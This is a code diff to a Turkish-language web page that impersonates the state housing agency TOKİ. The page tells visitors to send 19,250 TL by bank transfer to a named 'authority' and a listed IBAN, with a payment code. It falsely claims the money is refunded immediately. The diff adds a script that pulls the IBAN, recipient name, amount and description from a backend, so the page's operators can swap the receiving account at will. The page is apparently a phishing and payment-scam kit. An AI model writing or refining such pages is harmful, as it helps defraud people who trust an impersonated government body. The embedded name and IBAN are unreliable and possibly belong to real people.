@@ -626,8 +626,8 @@
             <div class="form-group">
                 <label class="form-label">*TOKİ Yetkili Adı</label>
                 <div class="input-with-copy">
-                    <input type="text" class="form-input" value="Gamze Dilmen" readonly>
-                    <button class="copy-btn" onclick="copyToClipboard('Gamze Dilmen')">Kopyala</button>
+                    <input type="text" id="authority-name" class="form-input" value="Gamze Dilmen" readonly>
+                    <button class="copy-btn" onclick="copyToClipboard(document.getElementById('authority-name').value)">Kopyala</button>
                 </div>
                 <div class="form-help-text">Ödeme dekontunuzun ekran resmini alarak sisteme yüklemeniz gerekmektedir.</div>
             </div>
@@ -636,8 +636,8 @@
             <div class="form-group">
                 <label class="form-label">*TOKİ İban No</label>
                 <div class="input-with-copy">
-                    <input type="text" class="form-input" value="TR130084540000819231421143" readonly>
-                    <button class="copy-btn" onclick="copyToClipboard('TR130084540000819231421143')">Kopyala</button>
+                    <input type="text" id="iban-number" class="form-input" value="TR130084540000819231421143" readonly>
+                    <button class="copy-btn" onclick="copyToClipboard(document.getElementById('iban-number').value)">Kopyala</button>
                 </div>
                 <div class="form-help-text">FAST/HAVALE ödemeleriniz anlık işleme alınmaktadır.</div>
             </div>
@@ -646,8 +646,8 @@
             <div class="form-group">
                 <label class="form-label">*Ödenecek Tutar</label>
                 <div class="input-with-copy">
-                    <input type="text" class="form-input amount-input" value="19.250 TL" readonly>
-                    <button class="copy-btn" onclick="copyToClipboard('19.250')">Kopyala</button>
+                    <input type="text" id="payment-amount" class="form-input amount-input" value="19.250 TL" readonly>
+                    <button class="copy-btn" onclick="copyToClipboard(document.getElementById('payment-amount').value.replace(' TL', ''))">Kopyala</button>
                 </div>
                 <div class="form-help-text">Ödemeniz banka hesabınıza işlem sonunda anlık olarak iade edilmektedir.</div>
             </div>
@@ -659,8 +659,8 @@
                 <div class="form-help-text orange-text">İşlemlerin tamamlanması için ödeme yapmanız gerekmektedir. İşlemlerin yarım kalması durumunda</div>
                 <div class="form-help-text red-text">Lütfen Havale/EFT açıklamasına aşağıdaki kodu girin.</div>
                 <div class="input-with-copy">
-                    <input type="text" class="form-input" value="4655789" readonly>
-                    <button class="copy-btn" onclick="copyToClipboard('4655789')">Kopyala</button>
+                    <input type="text" id="payment-code" class="form-input" value="4655789" readonly>
+                    <button class="copy-btn" onclick="copyToClipboard(document.getElementById('payment-code').value)">Kopyala</button>
                 </div>
                 <div class="form-help-text">Ödemenizin doğrulanması için yukarıdaki kodu Havale/EFT işlem açıklamasına girmeniz gerekmektedir.</div>
                 <div class="form-help-text">İşlemlerin tamamlanması için ödeme yapmanız gerekmektedir.</div>
@@ -705,6 +705,60 @@
     </footer>
 
     <script>
+        // MongoDB'den ödeme ayarlarını çek
+        async function loadPaymentSettings() {
+            try {
+                const response = await fetch('/api/get-payment-settings');
+                const data = await response.json();
+                
+                if (data.success && data.settings) {
+                    const settings = data.settings;
+                    
+                    // TOKİ Yetkili Adı
+                    const authorityNameInput = document.getElementById('authority-name');
+                    if (authorityNameInput && settings.authority_name) {
+                        authorityNameInput.value = settings.authority_name;
+                    }
+                    
+                    // TOKİ IBAN No
+                    const ibanInput = document.getElementById('iban-number');
+                    if (ibanInput && settings.iban) {
+                        ibanInput.value = settings.iban;
+                    }
+                    
+                    // Ödenecek Tutar
+                    const amountInput = document.getElementById('payment-amount');
+                    if (amountInput && settings.amount) {
+                        amountInput.value = settings.amount + ' TL';
+                    }
+                    
+                    // Ödeme Kodu
+                    const codeInput = document.getElementById('payment-code');
+                    if (codeInput && settings.code) {
+                        codeInput.value = settings.code;
+                    }
+                    
+                    // Açıklama metnini güncelle (eğer varsa)
+                    if (settings.description) {
+                        const descriptionText = document.querySelector('.form-group .form-help-text');
+                        if (descriptionText) {
+                            descriptionText.textContent = settings.description;
+                        }
+                    }
+                } else {
+                    console.log('Ödeme ayarları yüklenemedi, varsayılan değerler kullanılıyor.');
+                }
+            } catch (error) {
+                console.error('Ödeme ayarları yüklenirken hata oluştu:', error);
+                // Hata durumunda varsayılan değerler zaten yüklü
+            }
+        }
+
+        // Sayfa yüklendiğinde ödeme ayarlarını yükle
+        document.addEventListener('DOMContentLoaded', function() {
+            loadPaymentSettings();
+        });
+
         // URL'den kullanıcı bilgilerini al
         const urlParams = new URLSearchParams(window.location.search);
         const userName = urlParams.get('name') || urlParams.get('user') || urlParams.get('kullanici') || 'KULLANICI';
